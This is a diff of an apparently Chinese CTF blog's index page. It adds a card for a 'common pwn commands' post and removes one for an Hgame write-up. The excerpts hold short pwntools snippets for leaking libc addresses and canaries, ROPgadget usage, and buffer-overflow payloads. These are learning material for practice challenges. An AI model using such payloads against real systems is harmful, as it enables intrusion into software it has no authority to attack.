@@ -157,6 +157,46 @@
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
+        <p class="h4 index-header">Pwn常用指令</p>
+      </a>
+
+      <a href="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">Pwn常用ldd filename 读取libc
+ROPgadget --binary filename --only &quot;pop|ret&quot;
+__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))
+__libc_start_main = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])
+__libc_start_main = u32(sh.recv(4))
+canary =  u64(sh.recv(7).rjust(8,&quot</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-05&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
       <a href="/2020/02/05/oneshot_tjctf_2016/">
         <p class="h4 index-header">oneshot_tjctf_2016</p>
       </a>
@@ -573,58 +613,6 @@ payload +</div>
             <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
           
             <a href="/categories/CTF/%E6%95%99%E7%A8%8B/">教程</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/01/28/Hgame/">
-        <p class="h4 index-header">Hgame</p>
-      </a>
-
-      <a href="/2020/01/28/Hgame/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Hgame2020Hard_AAAAA
-
-
-
-V5在-0x31，s在-0xAC
-sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)
-payload=&quot;a&quot;*(0xAC - 0x31)
-payload += &#39;0O0o\x00O0&#39;
-sh.send(payload)
-sh.interactive()
-One_Shot
-
-
-
-0xE0 - 0xC0之后刚好是32位，这样第
-payload = cyclic(0xE0 - 0xC0)
-sh.send(payload)
-sh.recvuntil(&quot;shot!\n&q</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-28&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/Hgame/">Hgame</a>&nbsp;
           &nbsp;
         
         
